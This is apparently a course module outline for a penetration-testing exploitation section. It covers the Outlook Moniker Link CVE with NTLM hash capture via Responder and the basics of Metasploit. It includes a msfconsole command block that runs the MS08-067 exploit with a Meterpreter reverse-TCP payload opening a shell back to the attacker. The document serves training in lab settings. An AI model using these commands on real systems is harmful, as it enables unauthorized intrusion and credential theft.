# Section 7: Exploitation Basics

## 🧭 Overview

This module introduces you to the core concepts of exploitation — identifying and leveraging vulnerabilities to gain access or control of a target system. You'll start with a real-world CVE attack, then dive deep into the Metasploit framework, one of the most widely used tools in penetration testing.

## 📌 Key Concepts

|---------------------------|-----------------------------------------------------------------------------|
| CVE-2024-21413            | Exploit Microsoft Outlook Protected View bypass to leak user credentials    |
| Metasploit Framework      | A modular platform for discovering, exploiting, and validating vulnerabilities |
| Exploitation Techniques   | Using payloads and exploits to control systems                             |
| Meterpreter               | In-memory payload used for post-exploitation                               |
| Misconfiguration Exploits | Exploiting poorly secured Windows environments (Blue machine)              |

## 🧪 Hands-On Labs & Projects

### 1. 🕵️ Moniker Link (CVE-2024-21413)
Exploit the CVE vulnerability to extract credentials by sending a malicious `.rtf` file and bypassing Outlook’s Protected View.

- Tool: `Responder`, custom RTF file
- Outcome: NTLM hash capture over SMB

### 2. 🛠️ Metasploit Framework

#### 🔹 Metasploit: Introduction
- Learn core components: exploits, payloads, encoders, listeners
- Interface: `msfconsole`

#### 🔹 Metasploit: Exploitation

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOST <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit
```
